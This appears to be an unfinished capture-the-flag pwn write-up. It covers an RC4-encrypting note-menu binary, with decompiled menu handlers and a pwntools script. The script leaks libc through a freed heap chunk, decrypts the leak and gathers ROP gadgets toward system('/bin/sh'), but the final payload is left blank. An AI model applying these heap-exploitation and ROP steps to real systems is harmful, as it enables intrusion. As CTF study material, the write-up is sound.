# 1.0 Challenge
1. UNKNOWN username password, brute with bad compare function?
# 2.0 Analysis
compare method, 1 by 1 checking so can brute force

menu 
save:
```
input key < 0xf
input size < 0x300
malloc(size)
input value

算法....
v1 = strlen(aS4cur1tyP4ssw0);
sub_F98(&unk_203180, aS4cur1tyP4ssw0, v1);
sub_1152(&unk_203180, v4, v3);
*(&unk_203080 + 4 * v2) = v3;
qword_203088[2 * v2] = v4;

saved /
```
read
```
input key < 0xf

v1 = strlen(aS4cur1tyP4ssw0);
sub_F98(&unk_203180, aS4cur1tyP4ssw0, v1);
sub_1152(&unk_203180, qword_203088[2 * v3], *(&unk_203080 + 4 * v3));
printf("The result is:\n\t[key,value] = [%d,%s]\n", v3, qword_203088[2 * v3]);
puts("Encrypt and save value...");
v2 = strlen(aS4cur1tyP4ssw0);
sub_F98(&unk_203180, aS4cur1tyP4ssw0, v2);
sub_1152(&unk_203180, qword_203088[2 * v3], *(&unk_203080 + 4 * v3));

read / 
```
delete
```
input key < 0xf

ptr = qword_203088[2 * v2];
if ( ptr )
{
v1 = strlen(aS4cur1tyP4ssw0);
sub_F98(&unk_203180, aS4cur1tyP4ssw0, v1);
sub_1152(&unk_203180, ptr, *(&unk_203080 + 4 * v2));
free(ptr);
}

deleted / 
```
edit
```
input key < 0xf

v5 = qword_203088[2 * v3];
if ( v5 )
{
v4 = *(&unk_203080 + 4 * v3);
v1 = strlen(aS4cur1tyP4ssw0);
sub_F98(&unk_203180, aS4cur1tyP4ssw0, v1);
sub_1152(&unk_203180, v5, v4);
puts("Input the value: ");
sub_EE7(0LL, v5, v4);
puts("Encrypt and save value...");
v2 = strlen(aS4cur1tyP4ssw0);
sub_F98(&unk_203180, aS4cur1tyP4ssw0, v2);
sub_1152(&unk_203180, v5, v4);
}

edited / 
```


# 3.0 Solution

4.0 FLAG 

# 5.0 FINAL SCRIPT 
```python
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./pwn_patched"

libc  = ELF('./libc.so.6', checksec=False)
ld = ELF("ld-2.27.so")
exe = context.binary = ELF(pc)



scripts = """
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)
 
s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)

#rc4
def KSA(key):
    """ Key-Scheduling Algorithm (KSA) """
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S
 
def PRGA(S):
    """ Pseudo-Random Generation Algorithm (PRGA) """
    i, j = 0, 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        yield K
 
def RC4(key, text):
    """ RC4 encryption/decryption """
    S = KSA(key)
    keystream = PRGA(S)
    res = []
    for char in text:
        res.append(char ^ next(keystream))
    return bytes(res)

def save(size,index,payload):
    sla(b'>',b'1')
    sla(b':',str(index))
    sla(b':',str(size))
    sa(b':',payload)
   
def read(index):
    sla(b'>',b'2')
    sla(b':',str(index))

def delete(index):
    sla(b'>',b'3')
    sla(b':',str(index)) 

def edit(index,payload):
    sla(b'>',b'4')
    sla(b':',str(index))
    sa(b':',payload)

username = "a"
password = "a"

sla("username:\n",username)
sla("password:\n",password)

# 0-6 fill up tcahce 
# leak 7 
# 8 prevent combine 
for i in range(9):
    save(0x120,i,b'aaaa\n')
for i in range(7):
    delete(i)
# ????
delete(7)
read(7)

#leak libc
rl()
rl()
ru(b'] = [7,')
add2=ru(b']')[:-1]
print("this is enc:",add2)
key = b's4cur1ty_p4ssw0rd'
ciphertext = RC4(key, add2)
print("this is dec:",ciphertext)
leak = u64(ciphertext[0:8])
print("this is leak:",hex(leak))
# dbg()
# 0x7f2efea00000 - 0x7f2efedebca0 = 0x3EBCA0

libc.address = leak - 0x3EBCA0

# ROP
rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

print("libc base",hex(libc.address))
print("pop_rdi",hex(pop_rdi))
print("bin_sh",hex(bin_sh))
print("system",hex(system))
# payload = 

ti()

```


# 6.0 REFERENCE
ORW ????
https://kagehutatsu.com/?p=1143 ROP 这个是神
LEAK HEAP BASE
LEAK LIBC BASE


https://www.cnblogs.com/L1nyun/p/18516575 ROP 解释不多

https://blog.csdn.net/Mr_Fmnwon/article/details/143355594 SigreturnFrame 这个人的学习方法跟我很像
可以参考这个 https://blog.csdn.net/Mr_Fmnwon/article/details/143310980?spm=1001.2014.3001.5501